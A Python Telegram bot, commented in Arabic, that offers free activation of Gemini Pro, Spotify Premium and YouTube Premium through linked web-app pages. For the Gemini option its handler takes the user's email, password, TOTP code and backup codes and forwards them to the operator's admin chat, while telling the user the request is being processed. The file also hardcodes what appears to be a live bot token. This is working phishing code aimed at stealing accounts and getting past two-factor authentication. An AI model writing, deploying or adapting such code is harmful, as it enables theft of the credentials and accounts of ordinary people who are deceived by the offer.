import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
import json
import os
import threading
from flask import Flask

# توكن البوت والآيدي الخاص بك
API_TOKEN = '8840162276:AAEs2AlVqsdRBCaqa5yMLsw_noCb7cv1dn0'
ADMIN_ID = '8227136699'

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# --- 1. سيرفر الويب الوهمي لإبقاء البوت متصلاً بسيرفرات Render ---
@app.route('/')
def keep_alive():
    return "سيرفر البوت يعمل بنجاح 100%"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- 2. أوامر البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    
    markup.add(
        KeyboardButton("🤖 تفعيل Gemini Pro", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/gemini.html")),
        KeyboardButton("🎧 تفعيل Spotify Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/spotify.html")),
        KeyboardButton("▶️ تفعيل YouTube Premium", web_app=WebAppInfo(url="https://hanynew.github.io/mybot/youtube.html"))
    )
    
    bot.send_message(message.chat.id, "أهلاً بك!\nالرجاء اختيار الخدمة المطلوبة من القائمة بالأسفل 👇:", reply_markup=markup)

@bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    chat_id = message.chat.id
    username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
    
    try:
        data = json.loads(message.web_app_data.data)
        service = data.get('service', 'gemini')
        
        # رد فوري للعميل
        bot.send_message(chat_id, "طلبك قيد التنفيذ يرجى الانتظار")
        
        # تجهيز وإرسال البيانات للإدارة
        if service == "spotify":
            admin_msg = f"🎧 **طلب تفعيل Spotify**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
        elif service == "youtube":
            admin_msg = f"▶️ **طلب تفعيل YouTube**\n👤 العميل: {username}\n🔗 الرابط: `{data.get('link', 'غير متوفر')}`"
        else:
            admin_msg = f"🤖 **طلب تفعيل Gemini Pro**\n👤 العميل: {username}\n📧 الحساب: `{data.get('email', 'غير متوفر')}`\n🔑 الباسورد: `{data.get('password', 'غير متوفر')}`\n🔒 TOTP: `{data.get('totp', 'لا يوجد')}`\n🛡️ احتياطي: `{data.get('backup', 'لا يوجد')}`"

        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(ADMIN_ID, f"⚠️ تنبيه نظام: لم يتم معالجة البيانات بشكل صحيح. السبب: {str(e)}")
        bot.send_message(chat_id, "حدث خطأ، يرجى المحاولة مرة أخرى.")

# --- 3. تشغيل السيرفر والبوت معاً ---
if __name__ == "__main__":
    # تشغيل السيرفر الوهمي في مسار منفصل
    threading.Thread(target=run_web).start()
    # تشغيل البوت بخاصية الاستمرار
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
